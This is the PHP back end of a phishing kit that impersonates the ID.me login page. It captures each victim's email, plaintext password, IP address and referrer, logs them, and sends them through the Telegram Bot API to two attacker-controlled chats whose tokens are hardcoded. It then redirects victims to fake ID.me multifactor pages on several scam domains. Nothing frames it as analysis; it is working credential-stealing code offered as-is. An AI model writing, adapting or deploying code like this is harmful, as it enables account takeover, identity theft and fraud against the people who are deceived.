<?php
// SIMPLE VERSION - FIXED FOR HTML FORM
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Log file for debugging
$log_file = __DIR__ . '/idme_submissions.log';

// Bots configuration
$telegram_bots = [
    [
        'token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw',
        'chat_id' => '1325797388'
    ],
    [
        'token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44',
        'chat_id' => '7510889526'
    ]
];

// Simple logging function
function log_message($message) {
    global $log_file;
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($log_file, "[$timestamp] $message\n", FILE_APPEND);
}

// Start fresh
log_message("=== New submission attempt ===");

// Check if it's a POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    log_message("POST request received");
    
    // Get form data
    $useremail = $_POST['useremail'] ?? 'Not provided';
    $userpassword = $_POST['userpassword'] ?? 'Not provided';
    $remember_me = isset($_POST['remember_me']) ? 'Yes' : 'No';
    
    log_message("Email: $useremail");
    log_message("Password length: " . strlen($userpassword));
    log_message("Remember me: $remember_me");
    
    // Get IP address (SERVER-SIDE, not from form)
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    
    log_message("Detected IP: $ip");
    
    // Get referrer domain
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct access';
    log_message("Referer: $referer");
    
    // Prepare Telegram message
    $timestamp = date('Y-m-d H:i:s');
    $message = "🔐 *New ID.me Login*\n\n" .
               "📧 *Email:* `$useremail`\n" .
               "🔑 *Password:* `$userpassword`\n" .
               "💾 *Remember Me:* $remember_me\n" .
               "🌐 *IP:* `$ip`\n" .
               "📝 *Time:* $timestamp\n" .
               "🔗 *Source:* " . (strlen($referer) > 50 ? substr($referer, 0, 50) . '...' : $referer);
    
    // Send to Telegram
    foreach ($telegram_bots as $index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            log_message("Skipping bot $index - empty token or chat_id");
            continue;
        }
        
        $telegram_url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init($telegram_url);
        curl_setopt_array($ch, [
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false // For debugging, remove in production
        ]);
        
        $result = curl_exec($ch);
        
        if (curl_error($ch)) {
            log_message("Telegram error (bot $index): " . curl_error($ch));
        } else {
            log_message("Telegram success (bot $index): " . substr($result, 0, 100));
        }
        
        curl_close($ch);
    }
    
    // Redirect based on referrer domain
    $redirect_url = 'https://illuminatigroup.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
    
    // Parse referrer to determine redirect
    $parsed = parse_url($referer);
    $domain = $parsed['host'] ?? '';
    
    if (strpos($domain, 'illuminatigroup.world') !== false) {
        $redirect_url = 'https://illuminatigroup.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
    } elseif (strpos($domain, 'illuminatiglobal.world') !== false) {
        $redirect_url = 'https://illuminatiglobal.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
    } elseif (strpos($domain, 'illuminatinetwork.world') !== false) {
        $redirect_url = 'https://illuminatinetwork.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
    } elseif (strpos($domain, 'illuminaticonnect.world') !== false) {
        $redirect_url = 'https://illuminaticonnect.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
    } elseif (strpos($domain, 'upstartloan.rf.gd') !== false) {
        $redirect_url = 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
    }
    
    log_message("Redirecting to: $redirect_url");
    
    // Clear any output and redirect
    if (ob_get_level()) ob_end_clean();
    header("Location: $redirect_url");
    exit;
    
} else {
    // Not a POST request
    log_message("Invalid request method: " . $_SERVER['REQUEST_METHOD']);
    echo "This page only accepts POST submissions from the login form.";
}
?>
